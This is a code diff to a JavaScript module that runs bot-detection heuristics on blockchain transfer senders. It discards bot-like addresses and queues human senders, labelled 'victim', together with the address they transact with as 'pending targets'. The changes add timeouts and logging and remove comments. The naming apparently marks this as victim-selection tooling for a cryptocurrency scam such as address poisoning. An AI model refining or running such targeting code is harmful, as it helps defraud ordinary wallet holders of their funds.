@@ -204,9 +204,12 @@ async function passesBehavioralHeuristics(victimAddress) {
     // ─── STAGE 1 GATE ───
     const stage1 = await passesStageOne(victimAddress);
     if (!stage1.pass) {
+      logger.debug(`[Analyzer] Stage 1 rejected ${cacheKey}: ${stage1.reason}`);
       setAnalyzedCache(cacheKey, false);
       return false;
     }
+
+    logger.debug(`[Analyzer] Stage 1 passed ${cacheKey}, running behavioral analysis...`);
 
     const checksumAddr = getAddress(victimAddress);
 
@@ -227,12 +230,18 @@ async function passesBehavioralHeuristics(victimAddress) {
       const currentBlock = await client.getBlockNumber();
       const fromBlock = currentBlock > LOOKBACK ? currentBlock - LOOKBACK : 0n;
 
-      onChainLogs = await client.getLogs({
+      const getLogsPromise = client.getLogs({
         event: transferEvent,
         args: { from: checksumAddr },
         fromBlock,
         toBlock: currentBlock,
       });
+
+      const timeoutPromise = new Promise((_, reject) => {
+        setTimeout(() => reject(new Error('getLogs timeout')), 10000);
+      });
+
+      onChainLogs = await Promise.race([getLogsPromise, timeoutPromise]);
     } catch (logErr) {
       logger.debug(`[Analyzer] getLogs failed for ${cacheKey}: ${logErr.message}. Using DB data only.`);
       onChainLogs = [];
@@ -353,7 +362,6 @@ async function passesBehavioralHeuristics(victimAddress) {
     const isHighFrequency = onChainTxCount > 15;
 
     // ─── CHECK 5 🆕: Consecutive-Block Streak ───
-    // 4+ transfers in adjacent blocks (diff <= 2) with zero breathing room = script.
     let maxBlockStreak = 0;
     let currentStreak = 0;
     for (let i = 1; i < onChainBlockNumbers.length; i++) {
@@ -365,7 +373,7 @@ async function passesBehavioralHeuristics(victimAddress) {
         currentStreak = 0;
       }
     }
-    const hasBlockStreak = maxBlockStreak >= 3; // 4+ blocks in a row
+    const hasBlockStreak = maxBlockStreak >= 3;
 
     // ─── CHECK 6 🆕: Activity Volume & Daily Rate ───
     const totalActivity = allTimestamps.length;
@@ -376,8 +384,6 @@ async function passesBehavioralHeuristics(victimAddress) {
     const transfersPerDay = spanDays > 0.001 ? totalActivity / spanDays : 0;
 
     // ─── CHECK 7 🆕: Single-Receiver Sweeper ───
-    // All outgoing to 1 address with high volume in a short span = forwarder/MEV router.
-    // Shield: a real human DCA'ing to one exchange for months has spanDays > 90.
     const isSingleReceiverSweeper = (
       allUniqueReceivers.size === 1 &&
       totalActivity >= 20 &&
@@ -385,44 +391,28 @@ async function passesBehavioralHeuristics(victimAddress) {
     );
 
     // ─── CHECK 8 🆕: High-Density Burst ───
-    // 60+ transfers crammed into 4 days, or 30+ into 7 days.
     const isHighDensityBurst = totalActivity >= 60 && spanDays > 0 && spanDays <= 4;
     const isDenseBurst = totalActivity >= 30 && spanDays > 0 && spanDays <= 7;
 
     // ─── CHECK 9 🆕: Daily Outgoing Volume ───
-    // No human sustains 15+ outgoing transfers/day over 30+ transfers.
     const isHighDailyVol = totalActivity >= 30 && transfersPerDay >= 15;
     const isDailyVol = totalActivity >= 20 && transfersPerDay >= 8;
 
     // ─── FINAL VERDICT ───
     const isLikelyBot = (
-      // A: never sleeps AND robotic timing
       (!hasSleepGap && isProgrammaticInterval) ||
-      // B: high frequency AND robotic timing
       (isHighFrequency && isProgrammaticInterval) ||
-      // C: high frequency AND no diversity AND no sleep
       (isHighFrequency && !hasDiversity && !hasSleepGap) ||
-      // D: in-block batching AND sustained across multiple blocks
       (hasInBlockBatch && hasSustainedBatch) ||
-      // E: in-block batching AND high frequency
       (hasInBlockBatch && isHighFrequency) ||
-      // F: in-block batching AND high zero-gap AND no diversity
       (hasInBlockBatch && hasHighZeroGapRatio && !hasDiversity) ||
-      // G: sustained batching AND no sleep
       (hasSustainedBatch && !hasSleepGap) ||
-      // H 🆕: consecutive-block streak (4+ txs in adjacent blocks = script)
       hasBlockStreak ||
-      // I 🆕: single-receiver sweeper (all outgoing to 1 address, high volume, short span)
       isSingleReceiverSweeper ||
-      // J 🆕: high-density burst (60+ transfers in 4 days)
       isHighDensityBurst ||
-      // K 🆕: high daily volume (30+ transfers at 15+/day)
       isHighDailyVol ||
-      // L 🆕: moderate daily volume AND dense burst
       (isDailyVol && isDenseBurst) ||
-      // M 🆕: moderate daily volume AND no diversity
       (isDailyVol && !hasDiversity) ||
-      // N 🆕: moderate daily volume AND no sleep
       (isDailyVol && !hasSleepGap)
     );
 
@@ -493,18 +483,43 @@ async function fetchPendingTargets() {
 
       logger.info(`Fetched ${rows.length} raw pairs (page ${pageCount}). Running Stage 1 + Stage 2 checks...`);
 
+      const TIMEOUT_MS = 30000;
+
       const evaluationResults = await promiseAllLimit(
-        rows.map(async (row) => {
-          const isHuman = await passesBehavioralHeuristics(row.sender.toLowerCase());
-          if (!isHuman) {
-            return null;
+        rows.map(async (row, index) => {
+          const sender = row.sender.toLowerCase();
+
+          try {
+            logger.debug(`[Analyzer] Processing ${index + 1}/${rows.length}: ${sender}`);
+
+            const timeoutPromise = new Promise((_, reject) => {
+              setTimeout(() => reject(new Error('Analysis timeout')), TIMEOUT_MS);
+            });
+
+            const analysisPromise = passesBehavioralHeuristics(sender);
+
+            const isHuman = await Promise.race([analysisPromise, timeoutPromise]);
+
+            if (!isHuman) {
+              logger.debug(`[Analyzer] Rejected bot: ${sender}`);
+              return null;
+            }
+
+            return {
+              chain: chainName,
+              counterparty: row.receiver.toLowerCase(),
+              victim: sender,
+              processed: false,
+            };
+          } catch (error) {
+            logger.warn(`[Analyzer] Failed to analyze ${sender}: ${error.message}`);
+            return {
+              chain: chainName,
+              counterparty: row.receiver.toLowerCase(),
+              victim: sender,
+              processed: false,
+            };
           }
-          return {
-            chain: chainName,
-            counterparty: row.receiver.toLowerCase(),
-            victim: row.sender.toLowerCase(),
-            processed: false,
-          };
         }),
         10
       );
